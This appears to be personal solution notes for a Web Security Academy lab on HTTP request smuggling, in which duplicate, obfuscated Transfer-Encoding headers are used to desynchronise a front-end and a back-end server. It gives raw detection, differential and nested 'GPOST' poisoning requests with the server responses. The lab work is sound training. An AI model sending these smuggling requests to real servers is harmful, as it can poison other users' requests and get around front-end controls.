/*

a) The front-end server rejects requests that aren't using the GET or POST method. 
b) The two servers handle duplicate HTTP request headers in different ways.


1) turn off update content length, downgrade to HTTP 1, change to POST

2) detecting the disagreement, trick a server to use CL to determine the end of a request

POST / HTTP/1.1
Host: 0aaa00d1040b9bce80813a3f00be0022.web-security-academy.net
Content-Length: 6
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foobar

0

X

// timeout error
// front end is linient towards duplicate header


3) Differential attack (one normal and one attack request)

POST / HTTP/1.1
Host: 0aaa00d1040b9bce80813a3f00be0022.web-security-academy.net
Content-Length: 7
Content-Type: application/x-www-form-urlencoded

foo=bar

// 200 OK


// poison request send
POST / HTTP/1.1
Host: 0aaa00d1040b9bce80813a3f00be0022.web-security-academy.net
Content-Length: 3
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foobar

1
G
0

// 200 OK


// normal request send
POST / HTTP/1.1
Host: 0aaa00d1040b9bce80813a3f00be0022.web-security-academy.net
Content-Length: 7
Content-Type: application/x-www-form-urlencoded

foo=bar

// "Unrecognized method G0POST"


4) Poison with a GPOST request as a nested poison

POST / HTTP/1.1
Host: 0aaa00d1040b9bce80813a3f00be0022.web-security-academy.net
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foobar

5c
GPOST / HTTP/1.1
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

x=1
0


// 200 OK

POST / HTTP/1.1
Host: 0aaa00d1040b9bce80813a3f00be0022.web-security-academy.net
Content-Length: 7
Content-Type: application/x-www-form-urlencoded

foo=bar

// "Unrecognized method GPOST"

*/